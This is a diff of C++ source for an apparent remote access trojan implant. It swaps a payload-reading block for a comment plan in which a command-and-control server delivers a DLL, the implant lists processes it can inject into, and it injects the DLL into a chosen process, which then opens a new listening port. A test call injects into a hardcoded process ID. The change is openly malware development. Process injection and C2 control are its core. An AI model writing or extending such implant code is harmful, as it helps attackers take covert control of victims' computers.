@@ -3,12 +3,10 @@
 // RAT-Exe-Main.cpp : This file contains the 'main' function. Program execution begins and ends there.
 
 #include "RAT-Exe-Main.h"
-#include "RAT-Exe-Injection.h"
 
-
-INT main()
+HRESULT main()
 {
-    INT status = ERROR_SUCCESS;
+    HRESULT status = ERROR_SUCCESS;
     HANDLE hFile;
     DWORD dwBytesRead = 0;
     CHAR msgBuf[MAX_BUFFER_SIZE], *fileContents = NULL, *fileBytes = NULL;
@@ -21,23 +19,32 @@ INT main()
     OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");
 
 
-    // First, parse processes on the system we can see to inject our DLL into; send these back to our C2 to see which to inject into
+    // Exe opens port and waits...
 
-    // Read in payload; get size
-   
-    status = readPayload(filePath, &fileSize, &fileBytes);
-    if (status != ERROR_SUCCESS)
-    {
-        sprintf_s(msgBuf, "RAT-Exe::main - Failure from readPayload %d\n", status);
-        OutputDebugStringA(msgBuf);
-        goto cleanup;
-    }
+    // C2 reaches out establishes connection
+
+    // C2 sends filepath to write the dll to 
+
+    // C2 sends dll bytes
+
+    // Implant exe writes bytes to filepath
+
+    // Implant parses running processes for those it can inject into, send back to C2
+
+    // C2 chooses PID and sends to implant
+
+    // Implant exe injects dll into process, which runs new thread and opens new port; exe closes current port and shuts down
+
+
+
+
+
 
 
     
     // lets just test inject first to get that working 
         // paint inject test 
-    status = inject(6732, fileSize, fileBytes);
+    status = inject(6732, 15, filePath);
     if (status != ERROR_SUCCESS)
     {
         sprintf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
